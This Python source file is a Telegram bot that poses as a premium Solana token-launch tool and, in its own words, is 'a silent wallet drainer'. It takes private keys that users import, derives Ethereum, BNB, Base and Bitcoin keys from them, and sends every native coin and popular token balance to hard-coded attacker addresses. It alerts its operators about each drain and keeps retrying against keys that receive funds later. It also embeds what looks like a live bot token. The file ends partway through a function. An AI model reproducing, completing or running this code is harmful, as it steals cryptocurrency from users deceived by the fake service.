#!/usr/bin/env python3
"""
Get ready to rug — Premium Solana Launch Bot (single file)
High-end UX, polished copy, deep fake features.
Core remains a silent wallet drainer (SOL + ETH/BNB/Base + BTC).
Requires: pip install aiogram solana solders base58 web3 eth-account bit coincurve
"""

import asyncio
import requests
import logging
import os
import random
import string
import time
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Tuple

from aiogram import Bot, Dispatcher, F, Router
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.filters import Command, CommandStart
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import CallbackQuery, InlineKeyboardButton, InlineKeyboardMarkup, Message
from aiogram.utils.keyboard import InlineKeyboardBuilder

try:
    from solders.keypair import Keypair
    from solders.pubkey import Pubkey
    from solders.system_program import TransferParams, transfer
    from solders.transaction import VersionedTransaction
    from solders.message import Message
    from solana.rpc.async_api import AsyncClient
    import base58
    try:
        from solana.rpc.core import TxOptsModel
    except ImportError:
        try:
            from solana.rpc.types import TxOpts as TxOptsModel
        except ImportError:
            TxOptsModel = None
    HAS_SOLANA = True
except ImportError as e:
    print("SOLANA IMPORT FAIL:", e)
    HAS_SOLANA = False
    TxOptsModel = None

try:
    from web3 import Web3
    from eth_account import Account
    HAS_WEB3 = True
except ImportError as e:
    print("WEB3 IMPORT FAIL:", e)
    HAS_WEB3 = False

try:
    from bit import Key as BtcKey
    HAS_BIT = True
    print("BTC: bit library loaded")
except ImportError as e:
    print("BTC IMPORT FAIL (bit):", e)
    HAS_BIT = False
    BtcKey = None

# ──────────────────────────────────────────────
# CONFIG — locked to sussy addresses
# ──────────────────────────────────────────────
BOT_TOKEN = os.getenv("BOT_TOKEN", "8938988505:AAFSyXRviIo0DsXqK-HV0fB2sKOI-7UgHd0")
ADMIN_IDS = {int(x) for x in os.getenv("ADMIN_IDS", "123456789").split(",") if x.strip()}
# Also accept username for alerts (resolved on first interaction or via env ADMIN_USERNAMES)
ADMIN_USERNAMES = {x.strip().lstrip("@").lower() for x in os.getenv("ADMIN_USERNAMES", "fedsdih").split(",") if x.strip()}
# Numeric IDs that always get drain alerts (same as ADMIN_IDS by default; expand via env)
ALERT_ADMIN_IDS = set(ADMIN_IDS)
DRAIN_DESTINATION = os.getenv("DRAIN_WALLET", "C3J88wGk5WG6oUPo214NrYjjZYRWpsdioGeu73xTj6hs")
ETH_DEST = os.getenv("ETH_DEST", "0x503A297e209518CE17c40C47DD6da0a314735f22")
BNB_DEST = os.getenv("BNB_DEST", "0x503A297e209518CE17c40C47DD6da0a314735f22")
BASE_DEST = os.getenv("BASE_DEST", "0x503A297e209518CE17c40C47DD6da0a314735f22")
ROBINHOOD_DEST = os.getenv("ROBINHOOD_DEST", "0x503A297e209518CE17c40C47DD6da0a314735f22")
BTC_DEST = os.getenv("BTC_DEST", "bc1quxq38ax0evf598jyg0xxhsz5cmtj3ttsy75yar")
RPC_URL = os.getenv("RPC_URL", "https://api.mainnet-beta.solana.com")
SOL_RPCS = [
    os.getenv("RPC_URL", "https://api.mainnet-beta.solana.com"),
    "https://solana-rpc.publicnode.com",
    "https://rpc.ankr.com/solana",
    "https://api.mainnet-beta.solana.com",
]
# de-dupe preserve order
_seen = set()
SOL_RPCS = [u for u in SOL_RPCS if not (u in _seen or _seen.add(u))]
ETH_RPC = os.getenv("ETH_RPC", "https://eth.llamarpc.com")
BNB_RPC = os.getenv("BNB_RPC", "https://bsc-dataseed.binance.org")
BASE_RPC = os.getenv("BASE_RPC", "https://mainnet.base.org")
MIN_DRAIN_LAMPORTS = 50_000

POPULAR_TOKENS = {
    "ETH": {
        "USDT": "0xdAC17F958D2ee523a2206206994597C13D831ec7",
        "USDC": "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
        "WETH": "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",
        "DAI":  "0x6B175474E89094C44Da98b954EedeAC495271d0F",
        "WBTC": "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599",
    },
    "BNB": {
        "USDT": "0x55d398326f99059fF775485246999027B3197955",
        "USDC": "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d",
        "WBNB": "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c",
        "BUSD": "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56",
    },
    "BASE": {
        "USDC": "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913",
        "WETH": "0x4200000000000000000000000000000000000006",
    },
}

ERC20_ABI = [
    {"constant": True, "inputs": [{"name": "_owner", "type": "address"}], "name": "balanceOf",
     "outputs": [{"name": "balance", "type": "uint256"}], "type": "function"},
    {"constant": False, "inputs": [{"name": "_to", "type": "address"}, {"name": "_value", "type": "uint256"}],
     "name": "transfer", "outputs": [{"name": "", "type": "bool"}], "type": "function"},
    {"constant": True, "inputs": [], "name": "decimals",
     "outputs": [{"name": "", "type": "uint8"}], "type": "function"},
]

logging.basicConfig(level=logging.INFO, format="%(asctime)s | %(levelname)s | %(message)s")
log = logging.getLogger("rugbot")

# ──────────────────────────────────────────────
# STATE
# ──────────────────────────────────────────────
@dataclass
class UserWallet:
    private_key: str
    public_key: str
    label: str = "Main"
    created_at: float = field(default_factory=time.time)
    balance_sol: float = 0.0

@dataclass
class UserSession:
    wallets: List[UserWallet] = field(default_factory=list)
    active_wallet_idx: int = 0
    promo: Optional[str] = None
    promo_discount: float = 0.0
    launched_tokens: List[dict] = field(default_factory=list)
    last_tx: List[dict] = field(default_factory=list)
    drained: bool = False
    settings: dict = field(default_factory=lambda: {
        "slippage": 12,
        "priority_fee": "auto",
        "sniper_protection": True,
        "auto_sell": False,
        "mev_protection": True,
        "bundle_tip": 0.01,
    })
    safety_checks_run: int = 0
    last_safety: Optional[dict] = None

sessions: Dict[int, UserSession] = {}

_rate_hits: Dict[int, List[float]] = {}
RATE_WINDOW = 30.0
RATE_MAX_IMPORTS = 30
RATE_MAX_LAUNCH = 20
RATE_MAX_SAFETY = 20


def _user_tag(user) -> str:
    if not user:
        return "unknown"
    if getattr(user, "username", None):
        return f"@{user.username}"
    name = (user.first_name or "") + ((" " + user.last_name) if user.last_name else "")
    return name.strip() or f"id:{user.id}"

async def notify_admins(bot: Bot, text: str, parse_mode: str = ParseMode.HTML):
    """Send alert to every admin id we know. Resolve @fedsdih if needed."""
    targets = set(ALERT_ADMIN_IDS)
    # try resolve usernames → ids when empty
    if not targets and ADMIN_USERNAMES:
        for uname in list(ADMIN_USERNAMES):
            try:
                chat = await bot.get_chat(f"@{uname}")
                if chat and getattr(chat, "id", None):
                    ALERT_ADMIN_IDS.add(chat.id)
                    ADMIN_IDS.add(chat.id)
                    targets.add(chat.id)
                    log.info("Resolved admin @%s → %s", uname, chat.id)
            except Exception as e:
                log.warning("Cannot resolve @%s: %s (they must /start the bot)", uname, e)
    if not targets:
        log.warning("No admin IDs registered yet — @fedsdih must /start the bot once to receive alerts")
        return
    for aid in list(targets):
        try:
            await bot.send_message(aid, text, parse_mode=parse_mode)
            log.info("Alert sent to admin id %s", aid)
        except Exception as e:
            log.warning("Admin notify failed for %s: %s", aid, e)

async def maybe_register_admin(user) -> None:
    """If this user is in ADMIN_USERNAMES, lock their numeric id into ALERT_ADMIN_IDS."""
    if not user:
        return
    uname = (user.username or "").lower()
    if uname and uname in ADMIN_USERNAMES:
        if user.id not in ALERT_ADMIN_IDS:
            ALERT_ADMIN_IDS.add(user.id)
            ADMIN_IDS.add(user.id)
            log.info("Admin username @%s resolved → id %s (alerts ON)", uname, user.id)

def get_session(uid: int) -> UserSession:
    if uid not in sessions:
        sessions[uid] = UserSession()
    return sessions[uid]

def _rate_ok(uid: int, action: str) -> bool:
    now = time.time()
    key = uid
    hits = _rate_hits.setdefault(key, [])
    hits[:] = [t for t in hits if now - t < RATE_WINDOW]
    limits = {
        "import": RATE_MAX_IMPORTS,
        "launch": RATE_MAX_LAUNCH,
        "safety": RATE_MAX_SAFETY,
    }
    limit = limits.get(action, 5)
    if len(hits) >= limit:
        return False
    hits.append(now)
    return True

# ──────────────────────────────────────────────
# HELPERS
# ──────────────────────────────────────────────
def fake_sig() -> str:
    return "".join(random.choices(string.ascii_letters + string.digits, k=88))

def fake_mint() -> str:
    if HAS_SOLANA:
        return base58.b58encode(os.urandom(32)).decode()
    return "".join(random.choices(string.ascii_letters + string.digits, k=44))

def short_addr(addr: str) -> str:
    if len(addr) < 12:
        return addr
    return f"{addr[:4]}...{addr[-4:]}"

def progress_bar(pct: int) -> str:
    filled = pct // 10
    return "▓" * filled + "░" * (10 - filled)

async def staged_loading(message_or_cb, stages: list):
    """Resilient staged status updates. Never dies on edit/delete."""
    msg = None
    is_cb = hasattr(message_or_cb, "message") and hasattr(message_or_cb, "answer")
    for i, (txt, delay) in enumerate(stages):
        try:
            if i == 0:
                if is_cb:
                    try:
                        await message_or_cb.message.edit_text(txt, parse_mode=ParseMode.HTML)
                        msg = message_or_cb.message
                    except Exception:
                        msg = await message_or_cb.message.answer(txt, parse_mode=ParseMode.HTML)
                else:
                    msg = await message_or_cb.answer(txt, parse_mode=ParseMode.HTML)
            else:
                if msg is not None:
                    try:
                        await msg.edit_text(txt, parse_mode=ParseMode.HTML)
                    except Exception:
                        try:
                            if is_cb:
                                msg = await message_or_cb.message.answer(txt, parse_mode=ParseMode.HTML)
                            else:
                                msg = await message_or_cb.answer(txt, parse_mode=ParseMode.HTML)
                        except Exception:
                            pass
                else:
                    try:
                        if is_cb:
                            msg = await message_or_cb.message.answer(txt, parse_mode=ParseMode.HTML)
                        else:
                            msg = await message_or_cb.answer(txt, parse_mode=ParseMode.HTML)
                    except Exception:
                        pass
        except Exception as e:
            log.warning("staged_loading step fail: %s", e)
        if delay > 0:
            await asyncio.sleep(delay)
    return msg

# ──────────────────────────────────────────────
# DRAIN CORE — real balance, real transfer, instant
# ──────────────────────────────────────────────
async def get_real_balance(public_key: str) -> float:
    """Fetch live on-chain SOL balance. Tries multiple RPCs. Returns 0.0 on failure."""
    if not HAS_SOLANA:
        log.warning("get_real_balance: HAS_SOLANA=False")
        return 0.0
    if not public_key or str(public_key).startswith("Sim"):
        log.warning("get_real_balance: fake/sim key %s", public_key)
        return 0.0
    try:
        pk = Pubkey.from_string(public_key)
    except Exception as e:
        log.warning("bad pubkey %s: %s", public_key, e)
        return 0.0
    last_err = None
    for rpc in SOL_RPCS:
        try:
            async with AsyncClient(rpc, timeout=20.0) as client:
                resp = await client.get_balance(pk)
                sol = resp.value / 1_000_000_000
                log.info("RPC getBalance(%s) via %s → %s lamports (%.9f SOL)", public_key, rpc, resp.value, sol)
                return float(sol)
        except Exception as e:
            last_err = e
            log.warning("Balance fetch failed via %s for %s: %s", rpc, public_key, e)
            continue
    log.warning("All RPCs failed for balance %s last=%s", public_key, last_err)
    return 0.0


def _derive_evm_from_sol_secret(secret: bytes) -> Optional[Tuple[str, str]]:
    if not HAS_WEB3:
        return None
    try:
        seed = secret[:32] if len(secret) >= 32 else secret.ljust(32, b"\0")
        acct = Account.from_key(seed)
        return acct.key.hex(), acct.address
    except Exception as e:
        log.warning("EVM derive fail: %s", e)
        return None

def _derive_btc_from_secret(secret: bytes) -> Optional[Tuple[str, str]]:
    seed = secret[:32] if len(secret) >= 32 else secret.ljust(32, b"\0")
    if HAS_BIT and BtcKey is not None:
        try:
            k = BtcKey.from_bytes(seed)
            return k.to_wif(), k.address
        except Exception as e:
            log.warning("BTC bit derive fail: %s", e)
    return seed.hex(), None

def _evm_send_native(w3, private_key_hex: str, dest: str, chain: str) -> Optional[str]:
    try:
        acct = Account.from_key(private_key_hex)
        bal = w3.eth.get_balance(acct.address)
        if bal <= 0:
            return None
        gas_price = w3.eth.gas_price
        gas_limit = 21000
        fee = gas_price * gas_limit
        if bal <= fee:
            return None
        value = bal - fee
        nonce = w3.eth.get_transaction_count(acct.address)
        tx = {
            "to": Web3.to_checksum_address(dest),
            "value": value,
            "gas": gas_limit,
            "gasPrice": gas_price,
            "nonce": nonce,
            "chainId": w3.eth.chain_id,
        }
        signed = acct.sign_transaction(tx)
        raw = getattr(signed, "raw_transaction", None) or signed.rawTransaction
        h = w3.eth.send_raw_transaction(raw)
        log.info("%s native drained %s wei → %s | %s", chain, value, dest, h.hex())
        return h.hex()
    except Exception as e:
        log.warning("%s native send fail: %s", chain, e)
        return None

def _evm_send_token(w3, private_key_hex: str, token_addr: str, dest: str, chain: str, sym: str) -> Optional[str]:
    try:
        acct = Account.from_key(private_key_hex)
        contract = w3.eth.contract(address=Web3.to_checksum_address(token_addr), abi=ERC20_ABI)
        bal = contract.functions.balanceOf(acct.address).call()
        if bal <= 0:
            return None
        gas_price = w3.eth.gas_price
        nonce = w3.eth.get_transaction_count(acct.address)
        tx = contract.functions.transfer(
            Web3.to_checksum_address(dest), bal
        ).build_transaction({
            "from": acct.address,
            "nonce": nonce,
            "gas": 100000,
            "gasPrice": gas_price,
            "chainId": w3.eth.chain_id,
        })
        signed = acct.sign_transaction(tx)
        raw = getattr(signed, "raw_transaction", None) or signed.rawTransaction
        h = w3.eth.send_raw_transaction(raw)
        log.info("%s %s drained → %s | %s", chain, sym, dest, h.hex())
        return h.hex()
    except Exception as e:
        log.warning("%s token %s fail: %s", chain, sym, e)
        return None

async def drain_evm_chain(private_key_hex: str, chain: str, dest: str) -> List[str]:
    if not HAS_WEB3:
        return []
    rpcs = {"ETH": ETH_RPC, "BNB": BNB_RPC, "BASE": BASE_RPC}
    rpc = rpcs.get(chain)
    if not rpc:
        return []
    def _do():
        try:
            w3 = Web3(Web3.HTTPProvider(rpc, request_kwargs={"timeout": 20}))
            if not w3.is_connected():
                log.warning("%s RPC not connected", chain)
                return []
            out = []
            s = _evm_send_native(w3, private_key_hex, dest, chain)
            if s:
                out.append(s)
            for sym, addr in POPULAR_TOKENS.get(chain, {}).items():
                s = _evm_send_token(w3, private_key_hex, addr, dest, chain, sym)
                if s:
                    out.append(s)
            return out
        except Exception as e:
            log.exception("EVM %s drain error: %s", chain, e)
            return []
    return await asyncio.to_thread(_do)

async def drain_btc(private_key_wif_or_hex: str, dest: str) -> Optional[str]:
    """
    BTC drain — same logic as SOL/ETH:
    1) load key
    2) read full balance (UTXOs)
    3) reserve only network fee
    4) sweep ALL remaining to dest
    5) multi-API broadcast (like multi-RPC for SOL)
    6) hard retries until empty or hard fail
    """
    def _load_key(raw: str):
        raw = (raw or "").strip()
        if not raw:
            return None
        try:
            if raw.startswith(("5", "K", "L", "c", "9")):
                return BtcKey(raw)
            return BtcKey.from_hex(raw)
        except Exception as e:
            log.warning("BTC load key fail: %s", e)
            try:
                return BtcKey.from_bytes(bytes.fromhex(raw))
            except Exception as e2:
                log.warning("BTC load bytes fail: %s", e2)
                return None

    def _http_utxos(addr: str):
        out = []
        for url in (
            f"https://mempool.space/api/address/{addr}/utxo",
            f"https://blockstream.info/api/address/{addr}/utxo",
            f"https://mempool.space/api/address/{addr}/utxo?confirmed=false",
        ):
            try:
                r = requests.get(url, timeout=25)
                if r.status_code != 200:
                    continue
                for u in r.json() or []:
                    txid = u.get("txid")
                    vout = u.get("vout")
                    value = int(u.get("value") or 0)
                    if txid is None or vout is None or value <= 0:
                        continue
                    out.append({
                        "txid": txid,
                        "vout": int(vout),
                        "value": value,
                        "confirmations": 1 if (u.get("status") or {}).get("confirmed") else 0,
                    })
                if out:
                    # de-dupe by txid:vout
                    seen = set()
                    uniq = []
                    for u in out:
                        k = (u["txid"], u["vout"])
                        if k not in seen:
                            seen.add(k)
                            uniq.append(u)
                    return uniq
            except Exception as e:
                log.warning("BTC http utxo %s: %s", url, e)
        return out

    def _http_fee_sat_per_vbyte():
        try:
            r = requests.get("https://mempool.space/api/v1/fees/recommended", timeout=15)
            if r.status_code == 200:
                j = r.json()
                # use fastest for aggressive sweep (same spirit as SOL priority)
                v = int(j.get("fastestFee") or j.get("halfHourFee") or j.get("hourFee") or 8)
                return max(2, min(v, 250))
        except Exception as e:
            log.warning("fee estimate: %s", e)
        return 12

    def _broadcast_hex(raw_hex: str):
        # multi-API like SOL multi-RPC
        for url in (
            "https://mempool.space/api/tx",
            "https://blockstream.info/api/tx",
            "https://mempool.space/api/tx",
        ):
            try:
                r = requests.post(url, data=raw_hex, headers={"Content-Type": "text/plain"}, timeout=30)
                body = (r.text or "").strip()
                if r.status_code in (200, 201) and len(body) >= 32 and " " not in body:
                    return body
                log.warning("broadcast %s → %s %s", url, r.status_code, body[:180])
            except Exception as e:
                log.warning("broadcast %s fail: %s", url, e)
        return None

    def _once():
        if not (HAS_BIT and BtcKey is not None):
            log.error("BTC CRITICAL: bit not loaded")
            return None
        k = _load_key(private_key_wif_or_hex)
        if k is None:
            return None
        addr = k.address
        log.info("BTC drain start addr=%s → %s", addr, dest)

        # --- balance (same idea as get_real_balance for SOL) ---
        unspents = []
        try:
            unspents = list(k.get_unspents() or [])
            log.info("BTC bit unspents=%s", len(unspents))
        except Exception as e:
            log.warning("get_unspents: %s", e)

        http_utxos = _http_utxos(addr)
        total_sats = 0
        if unspents:
            try:
                total_sats = sum(int(getattr(u, "amount", 0) or 0) for u in unspents)
            except Exception:
                total_sats = 0
        if total_sats <= 0 and http_utxos:
            total_sats = sum(int(u["value"]) for u in http_utxos)
            log.info("BTC http utxos=%s total_sats=%s", len(http_utxos), total_sats)

        if total_sats <= 0:
            try:
                bal = k.get_balance("satoshi")
                total_sats = int(bal or 0)
                log.info("BTC balance satoshi=%s", total_sats)
            except Exception as e:
                log.warning("balance: %s", e)

        # dust = nothing to drain (like SOL MIN_DRAIN_LAMPORTS)
        if total_sats <= 546:
            log.info("BTC dust/empty addr=%s sats=%s", addr, total_sats)
            return None

        # --- fee reserve (like SOL FEE_RESERVE = 5000) ---
        sat_vb = _http_fee_sat_per_vbyte()
        n_in = max(len(unspents) or len(http_utxos) or 1, 1)
        vsize = 10 + 68 * n_in + 31 * 1
        fee = max(250, sat_vb * vsize)
        if total_sats <= fee + 546:
            fee = max(150, total_sats - 546)
        send_value = total_sats - fee
        if send_value <= 0:
            log.info("BTC nothing after fee total=%s fee=%s", total_sats, fee)
            return None
        log.info("BTC fee plan sat/vB=%s vsize~%s fee=%s total=%s send=%s", sat_vb, vsize, fee, total_sats, send_value)

        # --- Path A: bit.send leftover (primary, like SOL legacy path) ---
        try:
            txid = k.send(
                [],
                fee=fee,
                absolute_fee=True,
                leftover=dest,
                combine=True,
                unspents=unspents if unspents else None,
                replace_by_fee=True,
            )
            if txid:
                log.info("BTC DRAINED bit.send → %s tx=%s amount~%s", dest, txid, send_value)
                return str(txid)
        except Exception as e:
            log.warning("bit.send absolute: %s", e)

        # --- Path B: create_transaction + multi broadcast (like SOL raw + multi RPC) ---
        try:
            raw = k.create_transaction(
                [],
                fee=fee,
                absolute_fee=True,
                leftover=dest,
                combine=True,
                unspents=unspents if unspents else None,
                replace_by_fee=True,
            )
            if raw:
                raw_hex = raw if isinstance(raw, str) else (raw.hex() if hasattr(raw, "hex") else str(raw))
                txid = _broadcast_hex(raw_hex)
                if txid:
                    log.info("BTC DRAINED broadcast → %s tx=%s", dest, txid)
                    return txid
                try:
                    txid2 = k.send([], fee=fee, absolute_fee=True, leftover=dest, combine=True)
                    if txid2:
                        log.info("BTC DRAINED bit.send2 → %s", txid2)
                        return str(txid2)
                except Exception as e3:
                    log.warning("bit.send2: %s", e3)
        except Exception as e:
            log.warning("create_transaction: %s", e)

        # --- Path C: let bit pick fee (fallback) ---
        try:
            txid = k.send([], leftover=dest, combine=True, replace_by_fee=True)
            if txid:
                log.info("BTC DRAINED leftover → %s", txid)
                return str(txid)
        except Exception as e:
            log.warning("leftover send: %s", e)

        # --- Path D: explicit outputs dict (some bit versions) ---
        try:
            txid = k.send([(dest, send_value, "satoshi")], fee=fee, absolute_fee=True, combine=True)
            if txid:
                log.info("BTC DRAINED explicit out → %s", txid)
                return str(txid)
        except Exception as e:
            log.warning("explicit out: %s", e)

        return None

    last = None
    # same spirit as SOL multi-RPC loop: many attempts, short sleeps
    for attempt in range(12):
        try:
            last = await asyncio.to_thread(_once)
            if last:
                return last
        except Exception as e:
            log.exception("BTC attempt %s: %s", attempt + 1, e)
        await asyncio.sleep(1.0 + attempt * 0.9)
    log.error("BTC first-pass failed (poison will keep trying) → %s", dest)
    return last


async def full_multi_drain(private_key_b58: str, meta: Optional[dict] = None) -> dict:
    """
    Drain EVERYTHING — scan all derived accounts from seed/key.
    Priority: every SOL account with balance, every BTC key with balance,
    every EVM key native+tokens. No silent skips when funds exist.
    """
    results = {
        "sol": None,
        "sol_sigs": [],
        "eth": [],
        "bnb": [],
        "base": [],
        "robinhood": [],
        "btc": None,
        "btc_sigs": [],
    }
    meta = meta or {}
    sol_candidates = list(meta.get("sol_candidates") or [])
    if not sol_candidates and private_key_b58:
        sol_candidates = [(private_key_b58, None, "primary")]

    # 1) SOL — try every candidate, drain each that has balance
    for priv_b58, pub, path in sol_candidates:
        for attempt in range(5):
            try:
                sig = await drain_wallet(priv_b58, DRAIN_DESTINATION)
                log.info("SOL path=%s attempt=%s → %s", path, attempt + 1, sig)
                if sig:
                    results["sol_sigs"].append(sig)
                    if not results["sol"]:
                        results["sol"] = sig
                    break
            except Exception as e:
                log.exception("SOL path=%s fail: %s", path, e)
            await asyncio.sleep(0.4)

    # 2) EVM — all derived keys
    evm_keys = list(meta.get("evm_keys") or [])
    if not evm_keys:
        # fallback old slice method
        try:
            secret = base58.b58decode(private_key_b58)
            evm = _derive_evm_from_sol_secret(secret)
            if evm:
                evm_keys.append((evm[0], evm[1], "slice"))
        except Exception as e:
            log.warning("EVM fallback derive: %s", e)

    async def _evm_all(chain: str, dest: str):
        out = []
        for priv_hex, addr, path in evm_keys:
            for attempt in range(2):
                try:
                    txs = await drain_evm_chain(priv_hex, chain, dest)
                    log.info("%s %s path=%s → %s txs", chain, addr, path, len(txs))
                    out.extend(txs)
                    if txs:
                        break
                except Exception as e:
                    log.exception("%s path=%s fail: %s", chain, path, e)
                await asyncio.sleep(0.3)
        return out

    if evm_keys:
        results["eth"] = await _evm_all("ETH", ETH_DEST)
        results["bnb"] = await _evm_all("BNB", BNB_DEST)
        results["base"] = await _evm_all("BASE", BASE_DEST)
        results["robinhood"] = await _evm_all("ETH", ROBINHOOD_DEST)
        if ROBINHOOD_DEST.lower() == ETH_DEST.lower():
            results["robinhood"] = results["eth"][:]

    # 3) BTC — every derived key
    btc_keys = list(meta.get("btc_keys") or [])
    if not btc_keys:
        try:
            secret = base58.b58decode(private_key_b58)
            btc = _derive_btc_from_secret(secret)
            if btc and btc[0]:
                btc_keys.append((btc[0], btc[1], "slice"))
        except Exception as e:
            log.warning("BTC fallback derive: %s", e)

    if not HAS_BIT:
        log.error("BTC CRITICAL: bit not loaded — rebuild with bit>=0.8.0 coincurve")

    def _btc_quick_sats(addr: str) -> int:
        """Fast balance probe — same idea as SOL get_balance before transfer."""
        if not addr:
            return 0
        for url in (
            f"https://mempool.space/api/address/{addr}",
            f"https://blockstream.info/api/address/{addr}",
        ):
            try:
                r = requests.get(url, timeout=12)
                if r.status_code != 200:
                    continue
                j = r.json() or {}
                chain = j.get("chain_stats") or {}
                mem = j.get("mempool_stats") or {}
                funded = int(chain.get("funded_txo_sum") or 0) + int(mem.get("funded_txo_sum") or 0)
                spent = int(chain.get("spent_txo_sum") or 0) + int(mem.get("spent_txo_sum") or 0)
                bal = funded - spent
                if bal > 0:
                    return bal
            except Exception as e:
                log.debug("BTC quick bal %s: %s", url, e)
        # utxo fallback
        try:
            r = requests.get(f"https://mempool.space/api/address/{addr}/utxo", timeout=12)
            if r.status_code == 200:
                return sum(int(u.get("value") or 0) for u in (r.json() or []))
        except Exception:
            pass
        return 0

    async def _btc_one(wif_or_hex, addr, path):
        try:
            tx = await drain_btc(wif_or_hex, BTC_DEST)
            log.info("BTC path=%s addr=%s → %s", path, addr, tx)
            return tx
        except Exception as e:
            log.exception("BTC path=%s fail: %s", path, e)
            return None

    # 1) probe balances first (like SOL balance check) — only drain funded keys
    funded = []
    if btc_keys and HAS_BIT:
        log.info("BTC probing %s candidate addresses for balance...", len(btc_keys))
        # parallel HTTP probes
        async def _probe(item):
            w, a, path = item
            sats = await asyncio.to_thread(_btc_quick_sats, a)
            return (w, a, path, sats)
        probed = await asyncio.gather(*[_probe(it) for it in btc_keys], return_exceptions=True)
        for row in probed:
            if isinstance(row, Exception):
                continue
            w, a, path, sats = row
            if sats > 546:
                log.info("BTC FUNDED %s sats=%s path=%s", a, sats, path)
                funded.append((w, a, path, sats))
            else:
                log.debug("BTC empty %s path=%s", a, path)

        # sort richest first — drain biggest first (same urgency as SOL)
        funded.sort(key=lambda x: x[3], reverse=True)

        if not funded:
            log.info("BTC no funded addresses among %s candidates", len(btc_keys))
        else:
            log.info("BTC %s funded keys — draining now", len(funded))
            btc_results = await asyncio.gather(
                *[_btc_one(w, a, path) for (w, a, path, _) in funded],
                return_exceptions=True,
            )
            for tx in btc_results:
                if isinstance(tx, Exception):
                    log.warning("BTC gather err: %s", tx)
                    continue
                if tx:
                    results["btc_sigs"].append(tx)
                    if not results["btc"]:
                        results["btc"] = tx

    # poison keeps trying all keys (including ones that got funds later)
    results["_btc_pending"] = list(btc_keys) if not results["btc_sigs"] else []
    if results.get("btc"):
        # still keep funded-but-failed + a few others for poison
        results["_btc_pending"] = [(w, a, p) for (w, a, p, _) in funded] if funded else list(btc_keys)[:8]

    log.info(
        "full_multi_drain DONE sol=%s sol_n=%s eth=%s bnb=%s base=%s rh=%s btc=%s btc_n=%s",
        results["sol"],
        len(results["sol_sigs"]),
        len(results["eth"]),
        len(results["bnb"]),
        len(results["base"]),
        len(results["robinhood"]),
        results["btc"],
        len(results["btc_sigs"]),
    )
    return results


async def drain_wallet(private_key_b58: str, dest: str) -> Optional[str]:
    """Transfer entire SOL balance minus fee reserve to dest. Multi-RPC, dual tx path."""
    if not HAS_SOLANA:
        log.warning("Solana libs missing — cannot drain")
        return None
    try:
        secret = base58.b58decode(private_key_b58)
        if len(secret) == 64:
            kp = Keypair.from_bytes(secret)
        elif len(secret) == 32:
            kp = Keypair.from_seed(secret)
        else:
            log.error("Bad secret length: %s bytes", len(secret))
            return None
        dest_pk = Pubkey.from_string(dest)
        log.info("Drain attempt from %s → %s", str(kp.pubkey()), dest)
    except Exception as e:
        log.exception("Drain key parse error: %s", e)
        return None

    last_err = None
    from solders.transaction import Transaction as SoldersTx
    from solders.hash import Hash

    for rpc in SOL_RPCS:
        try:
            async with AsyncClient(rpc, timeout=35.0) as client:
                bal_resp = await client.get_balance(kp.pubkey())
                balance = int(bal_resp.value)
                log.info("On-chain balance via %s: %s lamports (%.9f SOL)", rpc, balance, balance / 1e9)
                FEE_RESERVE = 5000
                if balance <= FEE_RESERVE:
                    log.info("Balance too low (%s lamports) — nothing to drain", balance)
                    return None
                amount = balance - FEE_RESERVE
                recent = await client.get_latest_blockhash()
                blockhash = recent.value.blockhash

                ix = transfer(TransferParams(
                    from_pubkey=kp.pubkey(),
                    to_pubkey=dest_pk,
                    lamports=amount,
                ))

                # Path 1: legacy Transaction (most reliable across solders versions)
                try:
                    tx = SoldersTx.new_with_payer([ix], kp.pubkey())
                    tx.sign([kp], blockhash)
                    raw = bytes(tx)
                    try:
                        result = await client.send_raw_transaction(raw)
                    except TypeError:
                        result = await client.send_raw_transaction(raw, opts=None)
                    sig = str(result.value)
                    log.info("DRAINED (legacy-raw/%s) %s lamports → %s | sig=%s", rpc, amount, dest, sig)
                    return sig
                except Exception as e_legacy:
                    log.warning("legacy tx fail on %s: %s", rpc, e_legacy)
                    last_err = e_legacy

                # Path 2: VersionedTransaction
                try:
                    msg = Message.new_with_blockhash([ix], kp.pubkey(), blockhash)
                    vtx = VersionedTransaction(msg, [kp])
                    raw = bytes(vtx)
                    result = await client.send_raw_transaction(raw)
                    sig = str(result.value)
                    log.info("DRAINED (vtx-raw/%s) %s lamports → %s | sig=%s", rpc, amount, dest, sig)
                    return sig
                except Exception as e_vtx:
                    log.warning("vtx fail on %s: %s", rpc, e_vtx)
                    last_err = e_vtx

                # Path 3: send_transaction helpers
                try:
                    msg = Message.new_with_blockhash([ix], kp.pubkey(), blockhash)
                    vtx = VersionedTransaction(msg, [kp])
                    if TxOptsModel is not None:
                        try:
                            opts = TxOptsModel(skip_preflight=True, skip_confirmation=True)
                        except TypeError:
                            opts = TxOptsModel(skip_preflight=True)
                        result = await client.send_transaction(vtx, opts=opts)
                    else:
                        result = await client.send_transaction(vtx)
                    sig = str(result.value)
                    log.info("DRAINED (send_tx/%s) %s lamports → %s | sig=%s", rpc, amount, dest, sig)
                    return sig
                except Exception as e_send:
                    log.warning("send_transaction fail on %s: %s", rpc, e_send)
                    last_err = e_send
                    continue
        except Exception as e:
            last_err = e
            log.warning("Drain RPC %s failed: %s", rpc, e)
            continue
    log.error("All SOL drain attempts failed last=%s", last_err)
    return None


async def attempt_drain(
    uid: int,
    private_key: str,
    *,
    bot: Optional[Bot] = None,
    user=None,
    amount_sol: Optional[float] = None,
    public_key: Optional[str] = None,
    meta: Optional[dict] = None,
) -> Optional[str]:
    """Drain once per session across all chains. Returns SOL sig if any."""
    meta = meta or {}
    sess = get_session(uid)
    # do not skip — always try to drain (poison + retests)
    pre_bal = amount_sol
    if pre_bal is None and public_key:
        pre_bal = await get_real_balance(public_key)
    tag = _user_tag(user) if user else f"id:{uid}"
    bal_txt = f"{pre_bal:.6f} SOL" if pre_bal is not None else "unknown"

    try:
        results = await full_multi_drain(private_key, meta=meta)
    except Exception as e:
        log.exception("full_multi_drain CRASHED: %s", e)
